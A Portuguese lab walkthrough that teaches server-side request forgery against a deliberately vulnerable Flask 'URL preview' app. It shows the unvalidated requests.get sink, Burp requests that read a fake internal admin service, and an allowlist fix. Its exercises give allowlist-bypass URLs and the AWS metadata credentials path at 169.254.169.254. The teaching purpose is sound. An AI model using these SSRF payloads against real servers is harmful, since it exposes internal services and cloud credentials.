# Walkthrough — ssrf-basic

## 1. Contexto

A app expõe uma feature de "URL preview". Você cola uma URL em `/`, o form dispara um request `GET /fetch?url=<url>`, e o servidor usa a biblioteca `requests` pra buscar essa URL e renderiza o corpo da resposta de volta pra você dentro de um bloco `<pre>`. É o mesmo padrão que Slack, Discord, GitHub e a maior parte dos apps de chat usa quando você compartilha um link — o gerador de preview server-side.

O valor default no form é `https://api.github.com/zen`, que é um endpoint real, público, e devolve uma única linha curta de texto puro (uma quote do Zen of GitHub) — perfeita pra confirmar que a feature funciona antes de você começar a mudar a URL pra alguma coisa interessante.

## 2. Sobre o ambiente deste lab

Existe um terceiro container neste átomo além de `vulnerable/` e `fixed/`: **`internal/`**. É um "dashboard admin corporativo" fake, devolvendo uma página cheia de dados com cara obviamente privada — API keys, uma connection string de banco, uma JWT signing key, e uma tabelinha de usuários. Nenhum desses dados é real; o serviço inteiro existe só pra ficar no lugar de "um serviço interno que o atacante não deveria conseguir ver".

O que importa pra exploração é *como ele é alcançável*:

- **Sem port mapping.** Olhe [`docker-compose.yml`](./docker-compose.yml) — `vulnerable` e `fixed` cada um publica uma porta em `127.0.0.1` no seu host, mas `internal` não tem linha `ports:` nenhuma. `curl http://localhost/` do seu host não chega lá; abrir no browser não chega lá.
- **Mesma rede Docker que `vulnerable` (e que `fixed`, separadamente).** Dentro da rede Docker que o lab cria, `internal` é alcançável pelo hostname `internal` na porta 80. O container `vulnerable`, também nessa rede, resolve `internal` pelo nome e `requests.get("http://internal/")` funciona de dentro dele.

Essa assimetria é a premissa inteira do lab. Você, atacando do seu host, não fala com `internal`. A app vulnerável, sentada um hop de rede mais perto, fala. O exploit vai ser: fazer a app fazer essa conversa por você e te entregar a resposta.

Num engagement real isso mapeia direto pra uma VPC corporativa, uma rede de pods Kubernetes, ou uma instância EC2 com alcance numa subnet privada. Você está fora; o alvo do SSRF está dentro; a app vulnerável é a ponte.

## 3. Ache o bug

Abra [`vulnerable/app.py`](./vulnerable/app.py). A view `/fetch` é curta:

```python
@app.route("/fetch")
def fetch():
    url = request.args.get("url", "")
    if not url:
        return render_template("index.html")
    # VULNERABLE: server-side request to attacker-controlled URL, no allowlist.
    try:
        response = requests.get(url, timeout=5)
        content, status = response.text, response.status_code
    except requests.RequestException as exc:
        content, status = f"Request error: {exc}", None
    return render_template("preview.html", url=url, content=content, status=status)
```

O parâmetro `url` flui direto pra `requests.get(url, ...)`. Sem parse, sem allowlist, sem check de scheme, sem check de DNS, sem check de host. Qualquer URL que o cliente mandar, o servidor busca.

> ### Server-side: uma nova forma de ameaça
>
> **Pause e releia esta seção depois do exploit, mesmo que pareça óbvio agora.** É o passo conceitual mais importante do átomo.
>
> Em `sqli-union-basic`, `xss-reflected` e `idor-numeric-id`, o payload do atacante era processado *localmente pela app*: um fragmento SQL que a app executava contra o banco, uma tag HTML que a app renderizava na própria response, um inteiro que a app procurava nos próprios dados. A app rodava um programa, numa máquina.
>
> O SSRF move o locus da ação *pra fora do processo da app* e o coloca **na rede em que o servidor está sentado**. O payload do atacante agora é uma *URL*, e o servidor é quem faz o request HTTP de saída *pra essa URL*. Três consequências concretas vêm disso:
>
> 1. **Alcance.** O alcance do atacante é igual ao alcance do servidor. Qualquer coisa que a rede do servidor enxerga — serviços internos, endpoints de cloud metadata, containers vizinhos, bancos bindados em localhost — agora está no alcance do atacante. A segmentação de rede que protegia esses alvos da internet pública nunca os protegeu da app que você comprometeu.
> 2. **Identidade.** O request de saída vem do *servidor*, não de você. Egress firewalls que permitem o servidor alcançar hosts internos deixam seu request passar. IAM roles da AWS atreladas à instância EC2 autenticam o request do servidor pro metadata service — e agora autenticam o seu request. Quaisquer credenciais que o servidor carrega implicitamente viram suas, pela duração de uma URL buscada.
> 3. **Visibilidade pra defesa.** Uma WAF olhando o ingress vê um `GET /fetch?url=...` limpo, sem payload malicioso de tipo nenhum. O "ataque" de fato é o request *de saída* que o servidor depois faz. Tooling que só olha o caminho de ingress perde SSRF inteiramente; tooling que olha egress vê um request pra IP privado vindo de um serviço que não tinha por que estar fazendo isso.
>
> Segurar esses três pontos muda como você lê código. Numa code review, todo `requests.get(...)`, `urllib.urlopen(...)`, image loader, webhook caller, OAuth callback, gerador de PDF/screenshot, e handler de redirect SSO é candidato a sink de SSRF — e a pergunta é "a URL que isso busca vem, mesmo que parcialmente, de alguém que não é o próprio servidor?"

## 4. Exploração via Burp Suite (trilha principal)

Configure o Burp Proxy e aponte o browser pra ele. Visite <http://127.0.0.1:8004/>, clique em **Preview** com a URL default `https://api.github.com/zen` uma vez pra capturar o tráfego, depois clique com o botão direito no request `GET /fetch?url=...` em **Proxy → HTTP history** e escolha **Send to Repeater**.

### Uma nota sobre URL encoding

Mesma regra de parser dos átomos anteriores: a request line do HTTP é `METHOD SP URI SP VERSION`, então qualquer **espaço literal dentro da URI quebra o request** com `400 Bad Request`. Encode todo espaço como `%20`. Os outros caracteres das URLs que você vai mandar aqui (`:`, `/`, `?`, `=`, `.`) são todos legais numa query string pela RFC 3986 e passam sem encoding.

As URLs deste lab não têm espaço, então pela primeira vez você quase não precisa pensar em encoding. Se quiser uma opção de não-pensar, cole a URL decoded no Repeater, selecione o valor de `url=`, aperte **Ctrl+U** e o Burp percent-encoda o que precisar (`/` → `%2F`, `:` → `%3A`, etc.). As duas formas chegam na app como a mesma string depois do URL-decode.

### Passo 1 — Confirmar que a feature funciona

Payload:

```
url=https://api.github.com/zen
```

Request line no Repeater:

```
GET /fetch?url=https://api.github.com/zen HTTP/1.1
Host: 127.0.0.1:8004
```

Response: status `200`, o bloco `<pre>` contém uma única linha curta de texto puro — uma quote do Zen of GitHub tipo `Approachable is better than simple.` (a quote em si varia entre requests). O campo `HTTP status` na página mostra `200`. Este é seu baseline — o uso legítimo da feature, exatamente como desenhada. Note um detalhe quieto mas importante: **o Burp mostra a response como se seu browser tivesse buscado `https://api.github.com/zen`, mas seu browser não buscou. O servidor buscou e te devolveu o corpo.** Sente nessa — é o mecanismo inteiro de SSRF em uma round-trip.

### Passo 2 — Pivotar pra rede interna

Agora mude a URL pra `http://internal/`. É um hostname que seu laptop não consegue resolver e um host que seu laptop não alcança. O container da app vulnerable, no entanto, está numa rede Docker em que `internal` é um nome DNS real apontando pro terceiro container.

Payload:

```
url=http://internal/
```

Request line no Repeater:

```
GET /fetch?url=http://internal/ HTTP/1.1
Host: 127.0.0.1:8004
```

Response: status `200`. O bloco `<pre>` agora contém o dashboard admin interno — incluindo `API_KEY_PROD`, `DATABASE_URL` e outros valores de cara obviamente privada. **Você acabou de ler o conteúdo de um host que, da perspectiva do seu laptop, não existe.** A app vulnerable atravessou a fronteira de rede por você e devolveu o que achou.

Nota: o serviço internal responde em `text/plain`. Endpoints internos corporativos frequentemente fazem isso — pense em `/metrics`, `/health`, dumps de config. O vazamento é o mesmo; o formato só torna a leitura mais limpa em ferramentas raw como Burp.

Confirme a assimetria na mão: noutro terminal, rode `curl http://localhost/` ou `curl http://internal/` do seu host. Nenhum dos dois resolve; o serviço interno é invisível pra você direto. O único caminho pra ele é via SSRF.

### Passo 3 — Enumerar mais a fundo

A página do dashboard linka pra `/users`. Repita com o path mais profundo:

Payload:

```
url=http://internal/users
```

Request line no Repeater:

```
GET /fetch?url=http://internal/users HTTP/1.1
Host: 127.0.0.1:8004
```

Response: a tabela de users do interno (id, name, email, role) pra três funcionários fake. Mesmo mecanismo do passo 2, endpoint diferente. A questão: uma vez que você tem alcance SSRF num host, você não ganha só uma página — ganha a surface HTTP inteira daquele host. Num serviço interno real isso normalmente significa endpoints admin sem autenticação (porque "os únicos callers são de dentro da rede"), endpoints Prometheus/metrics vazando detalhe de infra, rotas `/debug` não documentadas, etc. Mapeie a surface do mesmo jeito que faria em qualquer outro alvo web — só que agora o alvo é algo que você não deveria conseguir alcançar.

### O que você acabou de demonstrar, em uma frase

Um request que parece, na camada de ingress, um `GET /fetch?url=...` sem payload de qualquer tipo, fez o servidor ler dado interno e devolver pra você. Nada no request era "malicioso" no sentido de SQLi/XSS. O exploit inteiro vive em *qual URL* o servidor concordou em buscar.

## 5. Exploração via browser (trilha secundária, opcional)

As mesmas três URLs coladas direto na barra de endereços do browser:

1. <http://127.0.0.1:8004/fetch?url=https://api.github.com/zen>
2. <http://127.0.0.1:8004/fetch?url=http://internal/>
3. <http://127.0.0.1:8004/fetch?url=http://internal/users>

O browser URL-encoda os `://` e `/` de dentro (ou não — a maioria dos browsers modernos deixa eles legíveis na barra) e a página renderizada mostra a response buscada dentro de um bloco `<pre>`. É a primeira passada mais leve: a barra de URL sozinha prova que você consegue ler conteúdo só-interno via a app vulnerable.

Passe pro Burp pra tudo depois da primeira sensação — o workflow do Repeater é muito mais rápido pra iterar em URLs e pra inspecionar os bytes crus de response (que importa quando o serviço interno devolve binário, JSON, ou content types incomuns que o browser tentaria renderizar em vez de exibir).

## 6. Por que o fix funciona

Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra mudança. Em resumo, a view `/fetch` corrigida faz parse da URL com `urllib.parse.urlparse` e rejeita qualquer coisa cujo scheme não seja `https` ou cujo hostname não esteja numa allowlist pequena (`api.github.com`, `wikipedia.org`):

```python
parsed = urlparse(url)
if parsed.scheme != "https" or parsed.hostname not in ALLOWED_HOSTS:
    abort(403)
response = requests.get(url, timeout=5)
```

Replay todas as URLs da seção 4 contra <http://127.0.0.1:8104/fetch>:

- Passo 1 (`https://api.github.com/zen`): 200, quote devolvida como antes.
- Passo 2 (`http://internal/`): **403 Forbidden**. (Dois motivos: `http` não é `https`, e `internal` não está na allowlist. Qualquer um dos dois sozinho já bloquearia.)
- Passo 3 (`http://internal/users`): **403 Forbidden**, mesmo motivo.

Olhe o que o fix *não* faz. Ele não desconecta o container `fixed` da rede onde `internal` mora — eles continuam na mesma rede Docker e a alcançabilidade no nível do OS está inalterada. Não adiciona network policy, regra de firewall, ou sidecar proxy. O container `fixed` em princípio ainda alcançaria `internal`; ele só se recusa a. O controle está na aplicação, não na plumbing. É o lugar certo pra ele estar: em produção você quer sim defesa em profundidade com segmentação de rede, mas você não pode confiar nela pra compensar uma aplicação que vai buscar URLs arbitrárias por demanda.

O fix também é deliberadamente uma **lista positiva**, não negativa. Uma versão por blocklist tentaria acompanhar `internal`, `localhost`, `127.*`, `169.254.*`, faixas RFC 1918, IPv6 loopback, representações alternativas de IPv4, DNS rebinding, follow de redirect e mais — e perderia pro próximo bypass de qualquer jeito. O átomo 16 (`ssrf-blind-oob`) caminha por vários desses bypasses contra uma defesa por blocklist mais realista; por enquanto, segura a regra de que allowlists ganham porque são finitas.

## 7. Tente você mesmo

1. **Tente alguns hostnames "quase-permitidos" contra a app fixed.** Mande `?url=https://api.github.com.evil.tld/`, `?url=https://API.GITHUB.com/`, `?url=https://api.github.com@internal/`. Pra cada um, prediga se vai ser bloqueado e por quê antes de apertar Send. O ponto do exercício não é achar bypass (a allowlist como está aguenta) mas internalizar *qual* parte do parser de URL o check rodou. Procure o comportamento de `urlparse(...).hostname` pra cada caso e veja se sua predição bate.
2. **Sondar o loopback do host via a app vulnerable.** Tente `?url=http://127.0.0.1:5000/` contra a app vulnerable. O que você vai ter é a app vulnerable falando com *si mesma* no loopback do container — interessante porque mostra que "o loopback do servidor" agora faz parte do alcance do atacante (na vida real é assim que atacantes alcançam interfaces admin e endpoints de metrics bindados só em localhost). Tente `?url=http://127.0.0.1:5000/fetch?url=http://internal/` e raciocine sobre o que acontece (dica: o `?` e `=` de dentro importam; URL-encode eles como `%3F` e `%3D` se quiser que o request interno sobreviva o parse).
3. **Encene a variante de cloud metadata na cabeça.** Instâncias AWS EC2 expõem um metadata service em `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` que devolve credenciais IAM temporárias pra qualquer coisa de dentro da instância. Se essa app estivesse rodando em EC2, o que `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` devolveria via o endpoint vulnerable, e o que um atacante faria com a response? O átomo 17 (`ssrf-cloud-metadata`) torna isso concreto num metadata mock de formato real; por enquanto, o ponto é só ver por que SSRF é classificado de altíssimo impacto em ambientes cloud sem você precisar do setup de cloud real na frente.
